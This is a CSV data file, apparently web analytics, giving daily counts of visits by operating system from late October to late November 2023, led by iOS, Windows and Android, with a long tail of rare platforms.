2023-11-21,Android,8379026
2023-11-21,Macintosh,4151471
2023-11-21,Linux,1189565
2023-11-21,Chrome OS,707210
2023-11-21,(not set),28889
2023-11-21,Tizen,986
2023-11-21,OS/2,719
2023-11-21,Fuchsia,592
2023-11-21,Firefox OS,494
2023-11-21,Playstation 4,406
2023-11-21,BlackBerry,124
2023-11-21,FreeBSD,113
2023-11-21,UNIX,38
2023-11-21,Samsung,36
2023-11-21,OpenBSD,31
2023-11-21,SymbianOS,21
2023-11-21,Windows Phone,20
2023-11-21,Xbox,19
2023-11-21,Mac OS,12
2023-11-21,NetBSD,9
2023-11-21,Sony,9
2023-11-21,Playstation Vita,7
2023-11-21,Nokia,5
2023-11-21,SunOS,5
2023-11-21,Unknown,5
2023-11-21,PalmOS,3
2023-11-21,iPhone,3
2023-11-21,NTT DoCoMo,2
2023-11-21,Solaris,2
2023-11-21,BeOS,1
2023-11-21,LG,1
2023-11-21,MOT,1
2023-11-21,macOS X,1
2023-11-20,iOS,17554026
2023-11-20,Windows,14421231
2023-11-20,Android,8654557
2023-11-20,Macintosh,4532428
2023-11-20,Linux,1062835
2023-11-20,Chrome OS,846923
2023-11-20,(not set),31838
2023-11-20,Tizen,976
2023-11-20,OS/2,717
2023-11-20,Fuchsia,603
2023-11-20,Firefox OS,495
2023-11-20,Playstation 4,404
2023-11-20,FreeBSD,136
2023-11-20,BlackBerry,129
2023-11-20,Samsung,49
2023-11-20,UNIX,48
2023-11-20,OpenBSD,41
2023-11-20,SymbianOS,23
2023-11-20,Windows Phone,20
2023-11-20,Xbox,18
2023-11-20,SunOS,15
2023-11-20,Mac OS,13
2023-11-20,NetBSD,12
2023-11-20,Nokia,7
2023-11-20,PalmOS,5
2023-11-20,Playstation Vita,5
2023-11-20,Sony,4
2023-11-20,Unknown,3
2023-11-20,iPhone,2
2023-11-20,BeOS,1
2023-11-20,MOT,1
2023-11-20,Playstation 3,1
2023-11-20,Solaris,1
2023-11-20,Vodafone,1
2023-11-19,iOS,11137694
2023-11-19,Android,6218273
2023-11-19,Windows,5328044
2023-11-19,Macintosh,2885468
2023-11-19,Linux,801893
2023-11-19,Chrome OS,336349
2023-11-19,(not set),20745
2023-11-19,Tizen,914
2023-11-19,Fuchsia,575
2023-11-19,OS/2,546
2023-11-19,Firefox OS,378
2023-11-19,Playstation 4,360
2023-11-19,FreeBSD,105
2023-11-19,BlackBerry,94
2023-11-19,Samsung,47
2023-11-19,OpenBSD,32
2023-11-19,SymbianOS,32
2023-11-19,UNIX,29
2023-11-19,Xbox,23
2023-11-19,Windows Phone,21
2023-11-19,Mac OS,19
2023-11-19,NetBSD,16
2023-11-19,Playstation Vita,11
2023-11-19,Nokia,7
2023-11-19,Sony,4
2023-11-19,SunOS,3
2023-11-19,Solaris,2
2023-11-19,BeOS,1
2023-11-19,MOT,1
2023-11-19,PalmOS,1
2023-11-19,Playstation Portable,1
2023-11-19,Unknown,1
2023-11-19,WebTV,1
2023-11-19,macOS X,1
2023-11-18,iOS,12769326
2023-11-18,Android,6739627
2023-11-18,Windows,5301597
2023-11-18,Macintosh,2672125
2023-11-18,Linux,855014
2023-11-18,Chrome OS,301300
2023-11-18,(not set),20911
2023-11-18,Tizen,1107
2023-11-18,OS/2,527
2023-11-18,Fuchsia,483
2023-11-18,Playstation 4,354
2023-11-18,Firefox OS,353
2023-11-18,FreeBSD,102
2023-11-18,BlackBerry,78
2023-11-18,Samsung,38
2023-11-18,UNIX,34
2023-11-18,OpenBSD,30
2023-11-18,Windows Phone,25
2023-11-18,SymbianOS,24
2023-11-18,Xbox,21
2023-11-18,NetBSD,18
2023-11-18,Mac OS,13
2023-11-18,Sony,7
2023-11-18,SunOS,6
2023-11-18,Unknown,5
2023-11-18,Playstation Vita,4
2023-11-18,Nokia,3
2023-11-18,iPhone,3
2023-11-18,PalmOS,2
2023-11-18,MOT,1
2023-11-18,NTT DoCoMo,1
2023-11-18,Nintendo Wii,1
2023-11-18,motorola/genevn_g/genevn:13/T1TGN33.60-55/ba972-f0e3a:user/release-keys,1
2023-11-17,iOS,15438836
2023-11-17,Windows,12252823
2023-11-17,Android,7815337
2023-11-17,Macintosh,4018188
2023-11-17,Linux,1008927
2023-11-17,Chrome OS,938605
2023-11-17,(not set),31118
2023-11-17,Tizen,1036
2023-11-17,OS/2,587
2023-11-17,Fuchsia,516
2023-11-17,Firefox OS,436
2023-11-17,Playstation 4,396
2023-11-17,FreeBSD,118
2023-11-17,BlackBerry,115
2023-11-17,Samsung,48
2023-11-17,UNIX,39
2023-11-17,OpenBSD,33
2023-11-17,Windows Phone,32
2023-11-17,Xbox,25
2023-11-17,Mac OS,20
2023-11-17,NetBSD,16
2023-11-17,SymbianOS,13
2023-11-17,SunOS,12
2023-11-17,Sony,8
2023-11-17,Unknown,8
2023-11-17,Playstation Vita,7
2023-11-17,Nokia,3
2023-11-17,iPhone,3
2023-11-17,PalmOS,2
2023-11-17,macOS X,2
2023-11-17,BeOS,1
2023-11-17,LG,1
2023-11-17,Nintendo Wii,1
2023-11-16,iOS,16619714
2023-11-16,Windows,14800127
2023-11-16,Android,8336425
2023-11-16,Macintosh,4472428
2023-11-16,Chrome OS,1196845
2023-11-16,Linux,1064880
2023-11-16,(not set),40595
2023-11-16,Tizen,1116
2023-11-16,OS/2,606
2023-11-16,Fuchsia,583
2023-11-16,Firefox OS,437
2023-11-16,Playstation 4,398
2023-11-16,FreeBSD,113
2023-11-16,BlackBerry,108
2023-11-16,Samsung,41
2023-11-16,UNIX,38
2023-11-16,Windows Phone,29
2023-11-16,SymbianOS,24
2023-11-16,OpenBSD,20
2023-11-16,Xbox,20
2023-11-16,NetBSD,15
2023-11-16,Mac OS,13
2023-11-16,SunOS,12
2023-11-16,Unknown,10
2023-11-16,Playstation Vita,7
2023-11-16,Sony,7
2023-11-16,Nokia,4
2023-11-16,LG,3
2023-11-16,WebTV,2
2023-11-16,iPhone,1
2023-11-16,macOS X,1
2023-11-15,iOS,16365156
2023-11-15,Windows,15156712
2023-11-15,Android,8261606
2023-11-15,Macintosh,4638224
2023-11-15,Chrome OS,1165505
2023-11-15,Linux,1046183
2023-11-15,(not set),46987
2023-11-15,Tizen,1114
2023-11-15,OS/2,681
2023-11-15,Fuchsia,600
2023-11-15,Firefox OS,388
2023-11-15,Playstation 4,375
2023-11-15,BlackBerry,136
2023-11-15,FreeBSD,124
2023-11-15,UNIX,71
2023-11-15,OpenBSD,45
2023-11-15,Samsung,39
2023-11-15,Windows Phone,29
2023-11-15,Xbox,29
2023-11-15,NetBSD,19
2023-11-15,SunOS,14
2023-11-15,Unknown,14
2023-11-15,SymbianOS,8
2023-11-15,Mac OS,7
2023-11-15,WebTV,6
2023-11-15,Sony,5
2023-11-15,Playstation Vita,4
2023-11-15,iPhone,4
2023-11-15,PalmOS,3
2023-11-15,Nokia,2
2023-11-15,IRIX,1
2023-11-15,NTT DoCoMo,1
2023-11-15,Playstation 3,1
2023-11-15,Solaris,1
2023-11-14,iOS,15515933
2023-11-14,Windows,15129838
2023-11-14,Android,8060214
2023-11-14,Macintosh,4625585
2023-11-14,Chrome OS,1210479
2023-11-14,Linux,1100695
2023-11-14,(not set),33575
2023-11-14,Tizen,1100
2023-11-14,OS/2,589
2023-11-14,Fuchsia,564
2023-11-14,Firefox OS,420
2023-11-14,Playstation 4,365
2023-11-14,BlackBerry,127
2023-11-14,FreeBSD,104
2023-11-14,Samsung,56
2023-11-14,UNIX,35
2023-11-14,OpenBSD,32
2023-11-14,Windows Phone,23
2023-11-14,SymbianOS,17
2023-11-14,Xbox,17
2023-11-14,NetBSD,15
2023-11-14,Mac OS,10
2023-11-14,Sony,8
2023-11-14,Playstation Vita,5
2023-11-14,SunOS,5
2023-11-14,Nokia,4
2023-11-14,WebTV,3
2023-11-14,PalmOS,2
2023-11-14,macOS X,2
2023-11-14,NTT DoCoMo,1
2023-11-13,iOS,17432474
2023-11-13,Windows,15100731
2023-11-13,Android,8767297
2023-11-13,Macintosh,4913954
2023-11-13,Chrome OS,1169353
2023-11-13,Linux,1060924
2023-11-13,(not set),30098
2023-11-13,Tizen,1080
2023-11-13,Fuchsia,646
2023-11-13,OS/2,633
2023-11-13,Firefox OS,427
2023-11-13,Playstation 4,346
2023-11-13,BlackBerry,141
2023-11-13,FreeBSD,118
2023-11-13,UNIX,49
2023-11-13,OpenBSD,43
2023-11-13,Samsung,37
2023-11-13,Windows Phone,20
2023-11-13,SymbianOS,15
2023-11-13,Xbox,14
2023-11-13,NetBSD,13
2023-11-13,Sony,9
2023-11-13,Mac OS,8
2023-11-13,PalmOS,6
2023-11-13,Playstation Vita,6
2023-11-13,SunOS,4
2023-11-13,Nokia,3
2023-11-13,macOS X,3
2023-11-13,Playstation 3,2
2023-11-13,BeOS,1
2023-11-13,IRIX,1
2023-11-13,LG,1
2023-11-13,NTT DoCoMo,1
2023-11-13,Nintendo WiiU,1
2023-11-13,Unknown,1
2023-11-13,WebTV,1
2023-11-13,iPhone,1
2023-11-12,iOS,11077100
2023-11-12,Android,5878486
2023-11-12,Windows,5312373
2023-11-12,Macintosh,2849761
2023-11-12,Linux,843191
2023-11-12,Chrome OS,360159
2023-11-12,(not set),31422
2023-11-12,Tizen,1006
2023-11-12,Fuchsia,584
2023-11-12,OS/2,516
2023-11-12,Firefox OS,378
2023-11-12,Playstation 4,315
2023-11-12,BlackBerry,105
2023-11-12,FreeBSD,69
2023-11-12,OpenBSD,49
2023-11-12,Samsung,44
2023-11-12,UNIX,32
2023-11-12,Windows Phone,29
2023-11-12,Xbox,29
2023-11-12,SymbianOS,22
2023-11-12,Mac OS,21
2023-11-12,NetBSD,13
2023-11-12,Sony,10
2023-11-12,SunOS,6
2023-11-12,PalmOS,5
2023-11-12,Nokia,4
2023-11-12,MOT,2
2023-11-12,Playstation Vita,2
2023-11-12,Vodafone,1
2023-11-11,iOS,11412539
2023-11-11,Android,6348723
2023-11-11,Windows,4979598
2023-11-11,Macintosh,2407577
2023-11-11,Linux,862339
2023-11-11,Chrome OS,294516
2023-11-11,(not set),34900
2023-11-11,Tizen,1024
2023-11-11,OS/2,535
2023-11-11,Fuchsia,524
2023-11-11,Firefox OS,370
2023-11-11,Playstation 4,360
2023-11-11,BlackBerry,112
2023-11-11,FreeBSD,61
2023-11-11,Samsung,48
2023-11-11,Mac OS,43
2023-11-11,OpenBSD,32
2023-11-11,Windows Phone,25
2023-11-11,Xbox,20
2023-11-11,SymbianOS,18
2023-11-11,UNIX,15
2023-11-11,NetBSD,10
2023-11-11,Sony,6
2023-11-11,Nintendo Wii,5
2023-11-11,Playstation Vita,5
2023-11-11,SunOS,4
2023-11-11,PalmOS,3
2023-11-11,BeOS,2
2023-11-11,LG,1
2023-11-10,iOS,14542134
2023-11-10,Windows,10377427
2023-11-10,Android,7509655
2023-11-10,Macintosh,3625120
2023-11-10,Linux,993474
2023-11-10,Chrome OS,721940
2023-11-10,(not set),25915
2023-11-10,Tizen,1104
2023-11-10,OS/2,627
2023-11-10,Fuchsia,550
2023-11-10,Firefox OS,377
2023-11-10,Playstation 4,325
2023-11-10,BlackBerry,131
2023-11-10,FreeBSD,81
2023-11-10,Samsung,52
2023-11-10,OpenBSD,31
2023-11-10,Windows Phone,25
2023-11-10,UNIX,23
2023-11-10,NetBSD,22
2023-11-10,Mac OS,19
2023-11-10,SymbianOS,18
2023-11-10,SunOS,17
2023-11-10,Xbox,15
2023-11-10,Playstation Vita,5
2023-11-10,Nokia,4
2023-11-10,PalmOS,4
2023-11-10,Sony,3
2023-11-10,macOS X,3
2023-11-10,MOT,1
2023-11-10,NTT DoCoMo,1
2023-11-10,Solaris,1
2023-11-10,Unknown,1
2023-11-10,Vodafone,1
2023-11-10,iPhone,1
2023-11-09,iOS,15390447
2023-11-09,Windows,14802253
2023-11-09,Android,8196257
2023-11-09,Macintosh,4337623
2023-11-09,Chrome OS,1128252
2023-11-09,Linux,1043407
2023-11-09,(not set),29363
2023-11-09,Tizen,1165
2023-11-09,OS/2,646
2023-11-09,Fuchsia,642
2023-11-09,Firefox OS,438
2023-11-09,Playstation 4,318
2023-11-09,BlackBerry,144
2023-11-09,FreeBSD,78
2023-11-09,UNIX,71
2023-11-09,Samsung,53
2023-11-09,Windows Phone,27
2023-11-09,OpenBSD,26
2023-11-09,Xbox,26
2023-11-09,SymbianOS,15
2023-11-09,NetBSD,11
2023-11-09,notWindows,9
2023-11-09,SunOS,8
2023-11-09,Nokia,5
2023-11-09,Playstation Vita,5
2023-11-09,Mac OS,4
2023-11-09,Sony,4
2023-11-09,Nintendo Wii,2
2023-11-09,Unknown,2
2023-11-09,iPhone,2
2023-11-09,IRIX,1
2023-11-09,NTT DoCoMo,1
2023-11-09,PalmOS,1
2023-11-09,Solaris,1
2023-11-09,macOS X,1
2023-11-08,iOS,15541998
2023-11-08,Windows,15190932
2023-11-08,Android,8086192
2023-11-08,Macintosh,4581756
2023-11-08,Chrome OS,1218329
2023-11-08,Linux,1201390
2023-11-08,(not set),29218
2023-11-08,Tizen,1145
2023-11-08,OS/2,703
2023-11-08,Fuchsia,589
2023-11-08,Firefox OS,435
2023-11-08,FreeBSD,375
2023-11-08,Playstation 4,305
2023-11-08,UNIX,176
2023-11-08,BlackBerry,142
2023-11-08,Samsung,38
2023-11-08,Xbox,32
2023-11-08,Windows Phone,18
2023-11-08,OpenBSD,15
2023-11-08,NetBSD,13
2023-11-08,SymbianOS,10
2023-11-08,Mac OS,9
2023-11-08,Playstation Vita,7
2023-11-08,Nintendo Wii,5
2023-11-08,PalmOS,5
2023-11-08,Nokia,3
2023-11-08,SunOS,3
2023-11-08,LG,2
2023-11-08,NTT DoCoMo,2
2023-11-08,Sony,2
2023-11-08,Unknown,1
2023-11-08,iPhone,1
2023-11-08,macOS X,1
2023-11-07,Windows,15651323
2023-11-07,iOS,15366142
2023-11-07,Android,8325667
2023-11-07,Macintosh,4603980
2023-11-07,Linux,1172651
2023-11-07,Chrome OS,1034471
2023-11-07,(not set),32257
2023-11-07,FreeBSD,1716
2023-11-07,Tizen,1138
2023-11-07,Fuchsia,600
2023-11-07,OS/2,591
2023-11-07,Firefox OS,388
2023-11-07,Playstation 4,336
2023-11-07,BlackBerry,137
2023-11-07,Samsung,53
2023-11-07,UNIX,42
2023-11-07,Xbox,32
2023-11-07,Windows Phone,28
2023-11-07,Mac OS,21
2023-11-07,SymbianOS,20
2023-11-07,OpenBSD,14
2023-11-07,NetBSD,11
2023-11-07,SunOS,10
2023-11-07,Nintendo Wii,6
2023-11-07,Sony,5
2023-11-07,macOS X,4
2023-11-07,notWindows,4
2023-11-07,PalmOS,3
2023-11-07,Nokia,2
2023-11-07,Playstation Vita,2
2023-11-07,BeOS,1
2023-11-07,IRIX,1
2023-11-07,MOT,1
2023-11-06,iOS,16177383
2023-11-06,Windows,15486647
2023-11-06,Android,8390222
2023-11-06,Macintosh,4833518
2023-11-06,Linux,1136595
2023-11-06,Chrome OS,1064155
2023-11-06,(not set),25833
2023-11-06,FreeBSD,1373
2023-11-06,Tizen,1116
2023-11-06,OS/2,598
2023-11-06,Fuchsia,557
2023-11-06,Firefox OS,420
2023-11-06,Playstation 4,323
2023-11-06,BlackBerry,147
2023-11-06,Samsung,52
2023-11-06,UNIX,49
2023-11-06,Xbox,32
2023-11-06,Mac OS,29
2023-11-06,Windows Phone,28
2023-11-06,OpenBSD,24
2023-11-06,SymbianOS,18
2023-11-06,NetBSD,11
2023-11-06,Sony,9
2023-11-06,SunOS,8
2023-11-06,Nokia,5
2023-11-06,Nintendo Wii,3
2023-11-06,NTT DoCoMo,2
2023-11-06,Playstation 3,2
2023-11-06,Playstation Vita,2
2023-11-06,BeOS,1
2023-11-06,MOT,1
2023-11-06,PalmOS,1
2023-11-06,Solaris,1
2023-11-06,Vodafone,1
2023-11-05,iOS,10474380
2023-11-05,Android,6340223
2023-11-05,Windows,6069046
2023-11-05,Macintosh,3003533
2023-11-05,Linux,954751
2023-11-05,Chrome OS,355912
2023-11-05,(not set),21783
2023-11-05,Tizen,976
2023-11-05,FreeBSD,699
2023-11-05,Fuchsia,643
2023-11-05,OS/2,569
2023-11-05,Firefox OS,383
2023-11-05,Playstation 4,335
2023-11-05,BlackBerry,119
2023-11-05,Samsung,53
2023-11-05,Windows Phone,34
2023-11-05,UNIX,26
2023-11-05,Xbox,23
2023-11-05,Mac OS,21
2023-11-05,OpenBSD,16
2023-11-05,SymbianOS,16
2023-11-05,NetBSD,9
2023-11-05,Nokia,5
2023-11-05,Sony,5
2023-11-05,SunOS,5
2023-11-05,Playstation Vita,4
2023-11-05,iPhone,4
2023-11-05,PalmOS,3
2023-11-05,Solaris,2
2023-11-05,DingOS,1
2023-11-05,IRIX,1
2023-11-04,iOS,12345707
2023-11-04,Android,6518428
2023-11-04,Windows,5429753
2023-11-04,Macintosh,2496993
2023-11-04,Linux,949167
2023-11-04,Chrome OS,280719
2023-11-04,(not set),26909
2023-11-04,Tizen,991
2023-11-04,FreeBSD,791
2023-11-04,OS/2,551
2023-11-04,Fuchsia,478
2023-11-04,Firefox OS,364
2023-11-04,Playstation 4,313
2023-11-04,BlackBerry,112
2023-11-04,Windows Phone,57
2023-11-04,Samsung,46
2023-11-04,UNIX,39
2023-11-04,OpenBSD,32
2023-11-04,Xbox,26
2023-11-04,Mac OS,24
2023-11-04,SymbianOS,22
2023-11-04,NetBSD,8
2023-11-04,Sony,7
2023-11-04,SunOS,7
2023-11-04,Nokia,5
2023-11-04,Playstation Vita,5
2023-11-04,Nintendo Wii,4
2023-11-04,PalmOS,2
2023-11-04,LG,1
2023-11-04,MOT,1
2023-11-04,WebTV,1
2023-11-04,iPhone,1
2023-11-04,macOS X,1
2023-11-03,iOS,14216907
2023-11-03,Windows,12014106
2023-11-03,Android,7427170
2023-11-03,Macintosh,3743850
2023-11-03,Linux,1056869
2023-11-03,Chrome OS,927795
2023-11-03,(not set),26358
2023-11-03,FreeBSD,1312
2023-11-03,Tizen,1033
2023-11-03,OS/2,564
2023-11-03,Fuchsia,473
2023-11-03,Firefox OS,455
2023-11-03,Playstation 4,342
2023-11-03,BlackBerry,145
2023-11-03,Windows Phone,78
2023-11-03,Samsung,50
2023-11-03,Xbox,29
2023-11-03,Mac OS,28
2023-11-03,OpenBSD,21
2023-11-03,SymbianOS,19
2023-11-03,UNIX,19
2023-11-03,Sony,9
2023-11-03,SunOS,9
2023-11-03,NetBSD,7
2023-11-03,Nintendo Wii,4
2023-11-03,Nokia,4
2023-11-03,Playstation Vita,4
2023-11-03,PalmOS,3
2023-11-03,macOS X,3
2023-11-03,BeOS,1
2023-11-03,MOT,1
2023-11-03,NTT DoCoMo,1
2023-11-03,Playstation 3,1
2023-11-02,iOS,14561955
2023-11-02,Windows,14462103
2023-11-02,Android,7924184
2023-11-02,Macintosh,4381931
2023-11-02,Chrome OS,1143009
2023-11-02,Linux,1042559
2023-11-02,(not set),27129
2023-11-02,FreeBSD,1372
2023-11-02,Tizen,1066
2023-11-02,OS/2,564
2023-11-02,Fuchsia,526
2023-11-02,Firefox OS,457
2023-11-02,Playstation 4,296
2023-11-02,BlackBerry,135
2023-11-02,Windows Phone,86
2023-11-02,OpenBSD,55
2023-11-02,Samsung,44
2023-11-02,Xbox,36
2023-11-02,Mac OS,24
2023-11-02,UNIX,23
2023-11-02,SymbianOS,14
2023-11-02,Sony,11
2023-11-02,SunOS,9
2023-11-02,NetBSD,8
2023-11-02,Playstation Vita,5
2023-11-02,Nintendo 3DS,3
2023-11-02,Nokia,3
2023-11-02,PalmOS,3
2023-11-02,MOT,2
2023-11-02,BeOS,1
2023-11-02,Playstation 3,1
2023-11-02,Playstation Portable,1
2023-11-02,Solaris,1
2023-11-02,WebTV,1
2023-11-02,iPhone,1
2023-11-01,Windows,15458810
2023-11-01,iOS,14837630
2023-11-01,Android,7623462
2023-11-01,Macintosh,4443859
2023-11-01,Linux,1106397
2023-11-01,Chrome OS,1064523
2023-11-01,(not set),30309
2023-11-01,FreeBSD,1237
2023-11-01,Tizen,1026
2023-11-01,OS/2,602
2023-11-01,Fuchsia,496
2023-11-01,Firefox OS,476
2023-11-01,Playstation 4,395
2023-11-01,BlackBerry,149
2023-11-01,Windows Phone,102
2023-11-01,OpenBSD,62
2023-11-01,UNIX,51
2023-11-01,Samsung,41
2023-11-01,Mac OS,38
2023-11-01,Xbox,23
2023-11-01,SymbianOS,18
2023-11-01,Sony,9
2023-11-01,NetBSD,7
2023-11-01,Nokia,5
2023-11-01,SunOS,5
2023-11-01,Nintendo WiiU,3
2023-11-01,PalmOS,3
2023-11-01,BeOS,2
2023-11-01,Nintendo 3DS,2
2023-11-01,Playstation Vita,2
2023-10-31,Windows,14246313
2023-10-31,iOS,14056394
2023-10-31,Android,7374196
2023-10-31,Macintosh,4337901
2023-10-31,Linux,1037740
2023-10-31,Chrome OS,979282
2023-10-31,(not set),33954
2023-10-31,FreeBSD,1377
2023-10-31,Tizen,1113
2023-10-31,OS/2,576
2023-10-31,Fuchsia,476
2023-10-31,Firefox OS,458
2023-10-31,Playstation 4,333
2023-10-31,BlackBerry,152
2023-10-31,Windows Phone,84
2023-10-31,UNIX,73
2023-10-31,OpenBSD,59
2023-10-31,Xbox,33
2023-10-31,Samsung,32
2023-10-31,Mac OS,24
2023-10-31,NetBSD,12
2023-10-31,SymbianOS,12
2023-10-31,SunOS,9
2023-10-31,Playstation Vita,7
2023-10-31,Sony,7
2023-10-31,PalmOS,5
2023-10-31,Nokia,3
2023-10-31,iPhone,2
2023-10-31,macOS X,2
2023-10-31,IRIX,1
2023-10-31,MOT,1
2023-10-31,Nintendo 3DS,1
2023-10-31,Nintendo WiiU,1
2023-10-31,Playstation 3,1
2023-10-30,Windows,15283791
2023-10-30,iOS,15220430
2023-10-30,Android,7878695
2023-10-30,Macintosh,4602344
2023-10-30,Linux,1170505
2023-10-30,Chrome OS,1091127
2023-10-30,(not set),22324
2023-10-30,FreeBSD,1313
2023-10-30,Tizen,1196
2023-10-30,OS/2,745
2023-10-30,Fuchsia,548
2023-10-30,Firefox OS,547
2023-10-30,Playstation 4,382
2023-10-30,BlackBerry,146
2023-10-30,Windows Phone,105
2023-10-30,OpenBSD,63
2023-10-30,UNIX,56
2023-10-30,Samsung,54
2023-10-30,Xbox,33
2023-10-30,SunOS,18
2023-10-30,NetBSD,12
2023-10-30,SymbianOS,10
2023-10-30,Mac OS,6
2023-10-30,Sony,6
2023-10-30,WebTV,4
2023-10-30,Nokia,3
2023-10-30,Nintendo Wii,2
2023-10-30,Nintendo WiiU,2
2023-10-30,PalmOS,2
2023-10-30,BeOS,1
2023-10-30,LG,1
2023-10-30,MOT,1
2023-10-30,Nintendo 3DS,1
2023-10-30,Playstation 3,1
2023-10-30,Playstation Portable,1
2023-10-30,Playstation Vita,1
2023-10-30,Solaris,1
2023-10-30,iPhone,1
2023-10-29,iOS,9928275
2023-10-29,Android,5906133
2023-10-29,Windows,5565512
2023-10-29,Macintosh,2756250
2023-10-29,Linux,893403
2023-10-29,Chrome OS,352600
2023-10-29,(not set),16816
2023-10-29,Tizen,1127
2023-10-29,FreeBSD,704
2023-10-29,OS/2,635
2023-10-29,Fuchsia,578
2023-10-29,Firefox OS,457
2023-10-29,Playstation 4,327
2023-10-29,BlackBerry,111
2023-10-29,Windows Phone,88
2023-10-29,Samsung,53
2023-10-29,UNIX,48
2023-10-29,OpenBSD,40
2023-10-29,Xbox,23
2023-10-29,Mac OS,11
2023-10-29,Playstation Vita,11
2023-10-29,NetBSD,9
2023-10-29,SymbianOS,9
2023-10-29,Nokia,8
2023-10-29,Sony,6
2023-10-29,Solaris,4
2023-10-29,Nintendo 3DS,3
2023-10-29,PalmOS,3
2023-10-29,SunOS,3
2023-10-29,BeOS,2
2023-10-29,Playstation 3,2
2023-10-29,macOS X,2
2023-10-29,Nintendo Wii,1
2023-10-29,WebTV,1
2023-10-28,iOS,12349823
2023-10-28,Android,6530683
2023-10-28,Windows,5371740
2023-10-28,Macintosh,2382710
2023-10-28,Linux,1084264
2023-10-28,Chrome OS,271427
2023-10-28,(not set),25835
2023-10-28,Tizen,1067
2023-10-28,FreeBSD,868
2023-10-28,OS/2,603
2023-10-28,Fuchsia,538
2023-10-28,Firefox OS,419
2023-10-28,Playstation 4,368
2023-10-28,BlackBerry,168
2023-10-28,Windows Phone,117
2023-10-28,UNIX,46
2023-10-28,Samsung,45
2023-10-28,OpenBSD,28
2023-10-28,Xbox,24
2023-10-28,Nokia,14
2023-10-28,SymbianOS,13
2023-10-28,SunOS,12
2023-10-28,Mac OS,9
2023-10-28,NetBSD,9
2023-10-28,Playstation Vita,9
2023-10-28,WebTV,8
2023-10-28,Sony,7
2023-10-28,NTT DoCoMo,3
2023-10-28,PalmOS,2
2023-10-28,LG,1
2023-10-28,MOT,1
2023-10-28,Nintendo Wii,1
2023-10-28,macOS X,1
2023-10-27,iOS,14287567
2023-10-27,Windows,12068956
2023-10-27,Android,7540636
2023-10-27,Macintosh,3583454
2023-10-27,Linux,1221604
2023-10-27,Chrome OS,868911
2023-10-27,(not set),25017
2023-10-27,FreeBSD,1441
2023-10-27,Tizen,1139
2023-10-27,OS/2,682
2023-10-27,Fuchsia,538
2023-10-27,Firefox OS,464
2023-10-27,Playstation 4,383
2023-10-27,BlackBerry,132
2023-10-27,Windows Phone,77
2023-10-27,UNIX,66
2023-10-27,Samsung,39
2023-10-27,notWindows,38
2023-10-27,Xbox,33
2023-10-27,OpenBSD,22
2023-10-27,NetBSD,13
2023-10-27,SunOS,13
2023-10-27,Nokia,11
2023-10-27,SymbianOS,8
2023-10-27,Playstation Vita,6
2023-10-27,Mac OS,4
2023-10-27,Nintendo 3DS,3
2023-10-27,Sony,3
2023-10-27,BeOS,1
2023-10-27,MOT,1
2023-10-27,NTT DoCoMo,1
2023-10-27,Nintendo Wii,1
2023-10-27,Nintendo WiiU,1
2023-10-27,PalmOS,1
2023-10-26,iOS,14905235
2023-10-26,Windows,14336495
2023-10-26,Android,8012585
2023-10-26,Macintosh,4110815
2023-10-26,Chrome OS,1088894
2023-10-26,Linux,918059
2023-10-26,(not set),25269
2023-10-26,FreeBSD,2152
2023-10-26,Tizen,1122
2023-10-26,OS/2,674
2023-10-26,Fuchsia,530
2023-10-26,Firefox OS,484
2023-10-26,Playstation 4,404
2023-10-26,BlackBerry,129
2023-10-26,Windows Phone,80
2023-10-26,UNIX,50
2023-10-26,OpenBSD,45
2023-10-26,Samsung,45
2023-10-26,Xbox,35
2023-10-26,NetBSD,20
2023-10-26,SymbianOS,18
2023-10-26,Nokia,15
2023-10-26,Sony,13
2023-10-26,SunOS,12
2023-10-26,Nintendo Wii,11
2023-10-26,Playstation Vita,8
2023-10-26,LG,3
2023-10-26,Playstation 3,3
2023-10-26,Mac OS,2
2023-10-26,PalmOS,2
2023-10-26,BeOS,1
2023-10-26,MOT,1
2023-10-26,Nintendo 3DS,1
2023-10-26,Nintendo WiiU,1
2023-10-25,iOS,15495966
2023-10-25,Windows,15048448
2023-10-25,Android,8034044
2023-10-25,Macintosh,4390497
2023-10-25,Chrome OS,1108870
2023-10-25,Linux,1049974
2023-10-25,(not set),35154
2023-10-25,FreeBSD,1821
2023-10-25,Tizen,1166
2023-10-25,OS/2,674
2023-10-25,Fuchsia,521
2023-10-25,Firefox OS,459
2023-10-25,Playstation 4,372
2023-10-25,BlackBerry,121
2023-10-25,OpenBSD,109
2023-10-25,UNIX,100
2023-10-25,Windows Phone,72
2023-10-25,Samsung,52
2023-10-25,Xbox,34
2023-10-25,SunOS,22
2023-10-25,NetBSD,20
2023-10-25,SymbianOS,15
2023-10-25,Sony,13
2023-10-25,Playstation Vita,10
2023-10-25,Nintendo Wii,7
2023-10-25,Nokia,5
2023-10-25,PalmOS,4
2023-10-25,Nintendo 3DS,3
2023-10-25,Mac OS,2
2023-10-25,Nintendo WiiU,2
2023-10-25,LG,1
2023-10-25,NTT DoCoMo,1
2023-10-25,iPhone,1
2023-10-25,macOS X,1
2023-10-24,iOS,14684372
2023-10-24,Windows,14662590
2023-10-24,Android,7798555
2023-10-24,Macintosh,4377257
2023-10-24,Chrome OS,1131708
2023-10-24,Linux,1104130
2023-10-24,(not set),26955
2023-10-24,FreeBSD,1471
2023-10-24,Tizen,1129
2023-10-24,OS/2,664
2023-10-24,Fuchsia,500
2023-10-24,Firefox OS,408
2023-10-24,Playstation 4,356
2023-10-24,BlackBerry,134
2023-10-24,UNIX,96
2023-10-24,Windows Phone,88
2023-10-24,Samsung,47
2023-10-24,OpenBSD,43
2023-10-24,Xbox,43
2023-10-24,SymbianOS,32
2023-10-24,NetBSD,19
2023-10-24,Playstation Vita,15
2023-10-24,SunOS,10
2023-10-24,Sony,8
2023-10-24,Mac OS,3
2023-10-24,Nintendo WiiU,3
2023-10-24,Solaris,3
2023-10-24,MOT,2
2023-10-24,Nintendo 3DS,2
2023-10-24,Nokia,2
2023-10-24,WebTV,2
2023-10-24,iPhone,2
2023-10-24,LG,1
2023-10-24,NTT DoCoMo,1
2023-10-24,PalmOS,1
2023-10-24,Vodafone,1
2023-10-23,Windows,15357184
2023-10-23,iOS,15027496
2023-10-23,Android,8173124
2023-10-23,Macintosh,4377987
2023-10-23,Chrome OS,1047199
2023-10-23,Linux,902558
2023-10-23,(not set),24239
2023-10-23,FreeBSD,1452
2023-10-23,Tizen,1079
2023-10-23,OS/2,633
2023-10-23,Fuchsia,544
2023-10-23,Firefox OS,416
2023-10-23,Playstation 4,382
2023-10-23,BlackBerry,129
2023-10-23,Windows Phone,94
2023-10-23,UNIX,68
2023-10-23,OpenBSD,43
2023-10-23,Xbox,29
2023-10-23,Samsung,27
2023-10-23,SunOS,24
2023-10-23,SymbianOS,20
2023-10-23,NetBSD,16
